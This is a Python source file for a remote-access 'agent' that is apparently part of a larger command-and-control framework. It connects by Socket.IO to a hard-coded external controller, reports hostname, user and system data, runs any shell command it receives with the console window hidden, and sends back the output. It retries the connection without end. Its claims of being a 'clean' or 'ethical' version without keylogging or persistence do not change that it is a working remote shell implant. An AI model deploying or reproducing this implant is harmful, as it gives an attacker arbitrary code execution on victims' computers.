#!/usr/bin/env python3
"""
Pure Agent - Clean agent that connects to original controller.py
No UAC bypasses, no persistence, no privilege escalation
Compatible with existing controller.py Socket.IO events
"""

import socketio
import sys
import os
import platform
import subprocess
import threading
import time
import uuid
import psutil
import json
from datetime import datetime

# Configuration - connects to your existing controller
SERVER_URL = "https://agent-controller-backend.onrender.com"
# Or for local testing: SERVER_URL = "http://localhost:5000"

AGENT_ID = str(uuid.uuid4())

# Socket.IO client
sio = socketio.Client(
    reconnection=True,
    reconnection_attempts=0,
    reconnection_delay=5,
    reconnection_delay_max=30
)

# Agent information
AGENT_INFO = {
    'id': AGENT_ID,
    'hostname': platform.node(),
    'os': platform.system(),
    'os_version': platform.version(),
    'architecture': platform.machine(),
    'username': os.getenv('USERNAME') or os.getenv('USER'),
    'ip': 'Unknown',
    'python_version': platform.python_version(),
    'type': 'pure_agent'  # Identifier
}

def log(message):
    """Simple logging"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[{timestamp}] {message}")

def execute_command(command):
    """Execute shell command and return output"""
    try:
        log(f"Executing command: {command}")
        
        # Handle special commands that the original controller might send
        if command == 'start-stream' or command == 'start-screen-stream':
            return "Screen streaming not available in pure agent (no privilege escalation required)"
        elif command == 'stop-stream':
            return "Screen streaming not active"
        elif command == 'start-camera-stream':
            return "Camera streaming not available in pure agent"
        elif command == 'start-audio-stream':
            return "Audio streaming not available in pure agent"
        elif command == 'shutdown':
            log("Shutdown requested by controller")
            sio.disconnect()
            sys.exit(0)
        
        # Execute regular shell command
        if platform.system() == 'Windows':
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
            )
        else:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
        
        output = result.stdout if result.stdout else result.stderr
        if not output:
            output = "Command executed successfully (no output)"
        
        log(f"Command completed: {len(output)} characters")
        return output
        
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def get_system_info():
    """Get system information - compatible with controller.py format"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            **AGENT_INFO,
            'cpu_usage': cpu_percent,
            'memory_total': memory.total,
            'memory_used': memory.used,
            'memory_percent': memory.percent,
            'disk_total': disk.total,
            'disk_used': disk.used,
            'disk_percent': disk.percent,
            'uptime': time.time() - psutil.boot_time(),
            'status': 'online'
        }
    except Exception as e:
        log(f"Error getting system info: {e}")
        return AGENT_INFO

# Socket.IO Event Handlers - Compatible with original controller.py

@sio.event
def connect():
    """Handle connection to controller"""
    log(f"✅ Connected to controller at {SERVER_URL}")
    log(f"Agent ID: {AGENT_ID}")
    log(f"Agent Type: Pure Agent (No UAC/Persistence)")
    
    # Register agent with controller
    sio.emit('register_agent', get_system_info())

@sio.event
def connect_error(data):
    """Handle connection error"""
    log(f"❌ Connection error: {data}")

@sio.event
def disconnect():
    """Handle disconnection"""
    log("⚠️ Disconnected from controller")

@sio.on('command')
def on_command(data):
    """Handle command from controller - original controller.py format"""
    try:
        command = data.get('command', '')
        agent_id = data.get('agent_id', '')
        
        # Check if command is for us
        if agent_id and agent_id != AGENT_ID:
            return
        
        log(f"Received command: {command}")
        
        # Execute command
        output = execute_command(command)
        
        # Send result back to controller
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error handling command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('execute_command')
def on_execute_command(data):
    """Handle execute_command event - for UI v2.1 compatibility"""
    try:
        command = data.get('command', '')
        agent_id = data.get('agent_id', '')
        
        if agent_id and agent_id != AGENT_ID:
            return
        
        log(f"Received execute_command: {command}")
        
        # Execute command
        output = execute_command(command)
        
        # Send result back
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'command': command,
            'output': output,
            'success': True,
            'execution_time': 0,
            'timestamp': time.time()
        })
        
    except Exception as e:
        log(f"Error handling execute_command: {e}")
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': f"Error: {str(e)}",
            'success': False,
            'timestamp': time.time()
        })

@sio.on('get_system_info')
def on_get_system_info(data):
    """Handle system info request"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        info = get_system_info()
        sio.emit('system_info_response', {
            'agent_id': AGENT_ID,
            'info': info,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error getting system info: {e}")

@sio.on('ping')
def on_ping(data):
    """Handle ping request from controller"""
    try:
        sio.emit('pong', {
            'agent_id': AGENT_ID,
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling ping: {e}")

@sio.on('shutdown')
def on_shutdown(data):
    """Handle shutdown request from controller"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        log("Shutdown requested by controller")
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Pure agent shutting down...',
            'timestamp': time.time()
        })
        
        time.sleep(1)
        sio.disconnect()
        sys.exit(0)
        
    except Exception as e:
        log(f"Error during shutdown: {e}")

@sio.on('request_screenshot')
def on_request_screenshot(data):
    """Handle screenshot request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Screenshot not available in pure agent (no screen capture libraries)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling screenshot: {e}")

@sio.on('start_keylogger')
def on_start_keylogger(data):
    """Handle keylogger request - not available in pure agent"""
    try:
        agent_id = data.get('agent_id', '')
        if agent_id and agent_id != AGENT_ID:
            return
        
        sio.emit('command_result', {
            'agent_id': AGENT_ID,
            'output': 'Keylogger not available in pure agent (ethical version)',
            'timestamp': time.time()
        })
    except Exception as e:
        log(f"Error handling keylogger: {e}")

def heartbeat():
    """Send periodic heartbeat to controller"""
    while True:
        try:
            if sio.connected:
                sio.emit('heartbeat', {
                    'agent_id': AGENT_ID,
                    'status': 'online',
                    'type': 'pure_agent',
                    'timestamp': time.time()
                })
            time.sleep(30)
        except Exception as e:
            log(f"Heartbeat error: {e}")
            time.sleep(30)

def status_update():
    """Send periodic status updates to controller"""
    while True:
        try:
            if sio.connected:
                info = get_system_info()
                sio.emit('agent_status', {
                    'agent_id': AGENT_ID,
                    'status': info,
                    'timestamp': time.time()
                })
            time.sleep(60)
        except Exception as e:
            log(f"Status update error: {e}")
            time.sleep(60)

def main():
    """Main entry point"""
    log("=" * 70)
    log("Pure Agent - Connects to Original controller.py")
    log("=" * 70)
    log(f"Agent ID: {AGENT_ID}")
    log(f"Hostname: {AGENT_INFO['hostname']}")
    log(f"OS: {AGENT_INFO['os']} {AGENT_INFO['os_version']}")
    log(f"User: {AGENT_INFO['username']}")
    log(f"Server: {SERVER_URL}")
    log("=" * 70)
    log("")
    log("✅ Features Available:")
    log("  ✓ Command execution")
    log("  ✓ System information")
    log("  ✓ Process listing (via commands)")
    log("  ✓ File browsing (via commands)")
    log("  ✓ Network info (via commands)")
    log("")
    log("❌ Features NOT Available (No Privilege Escalation):")
    log("  ✗ Screen streaming")
    log("  ✗ Camera streaming")
    log("  ✗ Audio streaming")
    log("  ✗ Keylogging")
    log("  ✗ UAC bypasses")
    log("  ✗ Persistence")
    log("  ✗ Registry modifications")
    log("")
    log("This is a CLEAN agent - No UAC, No Persistence, No Escalation")
    log("Compatible with original controller.py Socket.IO events")
    log("")
    log("=" * 70)
    
    # Start background threads
    heartbeat_thread = threading.Thread(target=heartbeat, daemon=True)
    heartbeat_thread.start()
    
    status_thread = threading.Thread(target=status_update, daemon=True)
    status_thread.start()
    
    # Connect to controller
    while True:
        try:
            log(f"Connecting to controller at {SERVER_URL}...")
            sio.connect(SERVER_URL, transports=['websocket', 'polling'])
            
            log("✅ Successfully connected!")
            log("Waiting for commands from controller...")
            log("The agent will appear in the controller UI")
            log("")
            
            # Keep connection alive
            sio.wait()
            
        except KeyboardInterrupt:
            log("\nShutting down...")
            break
        except Exception as e:
            log(f"❌ Connection error: {e}")
            log("Retrying in 10 seconds...")
            time.sleep(10)
    
    # Cleanup
    if sio.connected:
        sio.disconnect()
    
    log("Agent stopped - No cleanup needed (no persistence)")
    log("No registry entries, no scheduled tasks, no files left behind")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nAgent stopped by user")
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)
